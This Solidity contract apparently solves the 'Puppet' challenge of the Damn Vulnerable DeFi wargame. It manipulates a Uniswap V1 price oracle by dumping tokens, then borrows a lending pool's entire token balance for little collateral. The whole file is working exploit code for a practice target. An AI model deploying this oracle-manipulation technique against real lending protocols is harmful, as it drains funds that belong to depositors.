// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface IUniswapExchange {
  function tokenToEthSwapInput(uint256, uint256, uint256) external returns (uint256);
}

contract PuppetPoolHack {
  PuppetPool private pool;
  IUniswapExchange private uniswapExchange;

  constructor(PuppetPool _pool, IUniswapExchange _uniswapExchange) {
    pool = _pool;
    uniswapExchange = _uniswapExchange;
  }

  function hack(
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {
      // approve and transfer
      pool.token().permit(msg.sender, address(this), value, deadline, v, r, s);
      pool.token().transferFrom(msg.sender, address(this), value);
      pool.token().approve(address(uniswapExchange), value);

      // price manipulation
      uniswapExchange.tokenToEthSwapInput(value, 1, type(uint256).max);

      // drill out
      uint balance = pool.token().balanceOf(address(pool));
      uint256 collateral = pool.calculateDepositRequired(balance);
      pool.borrow{value: collateral}(balance, msg.sender);
  }

  receive() external payable {}
}
